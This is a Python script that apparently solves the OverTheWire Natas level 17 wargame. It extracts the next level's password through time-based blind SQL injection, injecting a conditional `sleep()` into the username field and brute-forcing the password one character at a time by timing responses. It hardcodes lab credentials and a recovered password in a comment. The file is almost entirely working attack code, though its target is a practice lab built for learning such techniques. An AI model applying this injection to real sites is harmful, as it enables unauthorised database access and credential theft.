#!/usr/bin/env python
# encoding: utf-8

"""
https://www.owasp.org/index.php/Blind_SQL_Injection
"""

import string
import time
import requests

NATAS_USER='natas17'
NATAS_PASS = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
NATAS_URL = 'http://natas17.natas.labs.overthewire.org/index.php?debug=1'
CHARS = "%s%s" % (string.digits, string.ascii_letters)
SQL = """natas18" and if (password like Binary "PASSWORD%", sleep(TIMEOUT), 1) #"""

def has_user(sql, timeout):
    data = {
        'username' : sql,
    }
    auth = (NATAS_USER, NATAS_PASS)
    stime = time.time()
    result = requests.post(NATAS_URL, auth=auth, data=data)
    etime = time.time()
    #print result.text
    del(result)
    return True if etime - stime > timeout else False

def guess_pw(length=2, password='', timeout=3):
    length = length - len(password)
    for i in range(1, length + 1):
        for c in CHARS:
            sql = SQL.replace('PASSWORD', "%s%s" % (password, c))
            sql = sql.replace('TIMEOUT', "%s" % (timeout))
            print sql
            if has_user(sql, timeout):
                password += c
                break
            time.sleep(0.1)
    return password

if __name__ == '__main__':
    #. xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
    password =  guess_pw(length=32,
                   password='', timeout=10)
    print "Password: %s, Length: %s" % (password, len(password))

